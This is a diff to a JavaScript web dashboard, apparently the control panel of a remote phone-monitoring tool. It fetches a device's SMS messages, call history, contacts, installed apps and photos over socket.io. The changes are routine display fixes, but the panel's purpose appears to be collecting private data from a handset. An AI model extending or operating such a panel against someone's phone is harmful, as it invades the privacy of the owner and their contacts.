@@ -979,7 +979,18 @@
                 socket.on(event, (data) => {
                     console.log(`Received ${event}:`, data);
                     if (data.uniqueId === deviceId || !data.uniqueId) {
-                        deviceData[tab] = data.data || data;
+                        // Extract the actual data
+                        const actualData = data.data || data;
+                        
+                        // For array data, ensure it's an array
+                        if (tab === 'sms' || tab === 'calls' || tab === 'contacts') {
+                            deviceData[tab] = Array.isArray(actualData) ? actualData : (actualData ? [actualData] : []);
+                        } else {
+                            deviceData[tab] = actualData;
+                        }
+                        
+                        console.log(`Stored ${tab} data:`, deviceData[tab]);
+                        
                         if (activeTab === tab) {
                             renderData();
                         }
@@ -1372,10 +1383,9 @@
             };
             
             if (tabMap[commandId]) {
-                // Only initialize as empty array for apps and photos, don't clear existing data
-                if (!deviceData[tabMap[commandId]]) {
-                    deviceData[tabMap[commandId]] = commandId === 'getInstalledApps' || commandId === 'getPhotos' ? [] : null;
-                }
+                // Clear data when requesting fresh data to show loading state
+                // For batched data (apps, photos), use empty array, for others use null
+                deviceData[tabMap[commandId]] = (commandId === 'getInstalledApps' || commandId === 'getPhotos') ? [] : null;
                 setActiveTab(tabMap[commandId]);
             }
             
@@ -1527,7 +1537,18 @@
             }
             
             if (!data || (Array.isArray(data) && data.length === 0)) {
-                content.innerHTML = '<div class="empty-data">No data yet. Click a command above to retrieve data.</div>';
+                content.innerHTML = `
+                    <div class="empty-data">
+                        <p>📭 No data received yet</p>
+                        <p style="font-size: 14px; color: #6b7280; margin-top: 8px;">
+                            ${activeTab === 'sms' ? 'Make sure the device has SMS messages and permissions are granted.' : 
+                              activeTab === 'calls' ? 'Make sure the device has call history and permissions are granted.' :
+                              activeTab === 'contacts' ? 'Make sure the device has contacts and permissions are granted.' :
+                              activeTab === 'photos' ? 'Make sure the device has photos in the gallery.' :
+                              'Click a command button above to retrieve data from the device.'}
+                        </p>
+                    </div>
+                `;
                 return;
             }
             
